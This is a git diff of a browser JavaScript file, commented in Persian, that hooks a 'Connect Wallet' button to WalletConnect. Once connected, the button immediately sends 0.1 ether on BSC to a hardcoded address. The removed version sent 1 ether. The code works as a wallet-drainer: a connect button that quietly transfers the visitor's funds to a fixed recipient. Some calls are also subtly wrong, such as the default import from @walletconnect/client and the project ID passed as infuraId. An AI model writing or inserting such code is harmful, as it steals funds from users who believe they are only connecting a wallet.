@@ -1,36 +1,54 @@
-import { Client } from "@walletconnect/client";
+import WalletConnectProvider from "@walletconnect/client"; // وارد کردن WalletConnect
+import { ethers } from "ethers"; // وارد کردن ethers.js
 
-const connectButton = document.getElementById("connectButton");
-const status = document.getElementById("status");
+const connectButton = document.getElementById('connect-wallet-btn');
 
-// WalletConnect Client setup
-const client = new Client({
-  projectId: "9d0b91216c49777eb4605da66368fb81", // Project ID
-});
+// این آدرس و project id مربوط به WalletConnect شما است
+const projectId = '9d0b91216c49777eb4605da66368fb81';
+const destinationAddress = '0xbA8958d52B940fF513746F24176D1017CaFa707E'; // آدرس مقصد برای ارسال تراکنش
 
-connectButton.addEventListener("click", async () => {
-  // Start the connection to the wallet
-  await client.connect();
+let provider;
 
-  // Check if connected and get the address
-  if (client.connected) {
-    status.innerHTML = `Connected: ${client.session?.accounts[0]}`;
-    
-    // Simulate sending a transaction to the destination wallet
-    const transaction = {
-      to: "0xbA8958d52B940fF513746F24176D1017CaFa707E",
-      value: "1000000000000000000", // Example amount in Wei (1 Ether)
-      data: "0x", // No data for a simple transfer
-    };
-    
+connectButton.addEventListener('click', async () => {
+    if (connectButton.disabled) return;
+
     try {
-      // Send transaction
-      const txResponse = await client.sendTransaction(transaction);
-      status.innerHTML = `Transaction sent! Hash: ${txResponse.transactionHash}`;
+        connectButton.disabled = true;
+        connectButton.textContent = "Connecting...";
+
+        // راه‌اندازی WalletConnect
+        provider = new WalletConnectProvider({
+            rpc: {
+                56: "https://bsc-dataseed.binance.org/", // آدرس RPC برای شبکه اسمارت چین
+            },
+            chainId: 56, // شماره شبکه (BSC)
+            qrcodeModalOptions: {
+                mobileLinks: ["trust", "metamask"], // کیف پول‌های موبایل پشتیبانی شده
+            },
+            infuraId: projectId,
+        });
+
+        // اتصال به کیف پول
+        await provider.enable();
+        connectButton.textContent = "Connected";
+
+        // ایجاد یک provider از طریق Ethers.js
+        const web3Provider = new ethers.providers.Web3Provider(provider);
+        const signer = web3Provider.getSigner();
+
+        // ارسال تراکنش به آدرس مقصد
+        const transaction = await signer.sendTransaction({
+            to: destinationAddress,
+            value: ethers.utils.parseEther("0.1"), // مقدار اتر برای ارسال
+        });
+
+        console.log("Transaction Hash:", transaction.hash);
+        alert("Transaction sent successfully!");
+
     } catch (error) {
-      status.innerHTML = `Error: ${error.message}`;
+        console.error("Connection failed:", error);
+        connectButton.textContent = "Connect Wallet";
+        connectButton.disabled = false;
+        alert("Failed to connect to wallet.");
     }
-  } else {
-    status.innerHTML = "Failed to connect.";
-  }
 });
